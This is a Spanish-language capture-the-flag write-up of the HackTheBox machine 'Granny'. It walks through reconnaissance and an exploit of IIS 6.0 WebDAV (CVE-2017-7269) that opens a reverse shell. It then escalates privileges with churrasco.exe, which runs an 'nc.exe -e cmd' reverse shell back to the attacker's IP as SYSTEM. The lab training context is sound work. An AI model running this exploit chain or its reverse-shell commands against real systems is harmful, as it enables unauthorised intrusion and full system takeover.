---
title: HTB - Granny
published: true
categories: [Windows]
tags: [eJPT, eWPT, OSCP, Fácil]
---


<img src="/assets/HTB/Granny/granny.png">

¡Hola!
Vamos a resolver de la máquina `Granny` de dificultad "Fácil" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **Microsoft IIS 6.0 - CVE-2017-7269**
- **Churrasco [Privilege Escalation]**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Granny`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.10.15
PING 10.10.10.15 (10.10.10.15) 56(84) bytes of data.
64 bytes from 10.10.10.15: icmp_seq=1 ttl=127 time=42.3 ms

--- 10.10.10.15 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Windows** debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```bash
nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.15 -oG allPorts

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p80 10.10.10.15 -oN targeted

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Date: Fri, 28 Oct 2022 15:07:39 GMT
|_http-server-header: Microsoft-IIS/6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
whatweb 10.10.10.15

http://10.10.10.15 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/6.0], IP[10.10.10.15], Microsoft-IIS[6.0][Under Construction], MicrosoftOfficeWebServer[5.0_Pub], UncommonHeaders[microsoftofficewebserver], X-Powered-By[ASP.NET]
```

### IIS Exploit

* * *

Observamos que la máquina víctima está corriendo bajo **Microsoft IIS 6.0**. Tras una búsqueda en Google encontramos que esta versión de IIS es vulnerable al exploit [CVE-2017-7269](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2017-7269) por lo que utilizaremos la herramienta del github de [g0rx](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269) que nos va a generar una reverse shell directamente con la máquina víctima.

Descarga de exploit

```bash
cd ../exploits
wget https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell
mv iis6\ reverse\ shell iisExploit.py
```
Ejecutamos el exploit y nos indica el modo de uso

```bash
python iisExploit.py
usage:iis6webdav.py targetip targetport reverseip reverseport
```

Creamos un listener

```bash
rlwrap nc -lnvp 443
```

Ejecutamos el exploit

```bash
python iisExploit.py 10.10.10.15 80 10.10.14.94 443
```
Reverse Shell

```bash
listening on [any] 443 ...
connect to [10.10.14.94] from (UNKNOWN) [10.10.10.15] 1033
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>
```

### Escalada Privilegios

* * *

Ahora que nos encontramos dentro de la máquina víctima, vamos a realizar la enumeración de permisos y tareas con la finalidad de lograr escalar privilegios.

Enumeración privilegios de usuario

```bash
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

Detectamos que tenemos el privilegio asignado `SeImpersonatePrivilege` gracias al cual podemos escalar privilegios con la variante de la herramienta `JuicyPotato.exe` denominada `churrasco.exe`, procedemos a su descarga en el directorio de trabajo `exploits` desde el GitHub de [Re4son](https://github.com/Re4son/Churrasco/)

```bash
wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
```
También nos descargamos en el directorio de trabajo la herramienta `nc.exe` del repositorio de GitHub de [int0x33](https://github.com/int0x33/nc.exe/)

Proecedemos a subir la herramienta `churrasco.exe` a la máquina víctima creando un recurso compartido a nivel de red con `impacket-smbserver`

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

En la máquina víctima ingresamos a la carpeta `C:\Windows\Temp`, creamos la carpeta `privesc` y copiamos el archivo `churrasco.exe`

```bash
cd c:\Windows\Temp
md privesc
cd privesc
copy \\10.10.14.94\smbFolder\churrasco.exe churrasco.exe
```

Creamos un listener

```bash
rlwrap nc -lnvp 443
```

Ejecutamos en la máquina víctima `churrasco.exe` para que ejecute con privilegios `nc.exe` y así establecer una reverse shell con privilegios de `nt authority\system`

```bash
churrasco.exe "\\10.10.14.94\smbFolder\nc.exe -e cmd 10.10.14.94 443"
```

Obtenemos una shell como `nt authority\system`

```bash
whoami
nt authority\system
```

### Flags

* * *

Tras una búsqueda desde la raíz localizamos las flags en sus respectivos directorios. Con el comando `type` nos muestra el contenido.

```bash
#USER
cd c:\
dir /b/s user.txt
C:\Documents and Settings\Lakis\Desktop\user.txt
```

```bash
#ROOT
dir /b/s root.txt
C:\Documents and Settings\Administrator\Desktop\root.txt
```

Hemos completado la máquina **Granny** de HackTheBox!! Happy Hacking!!


<img src="/assets/HTB/Granny/pwned.png">
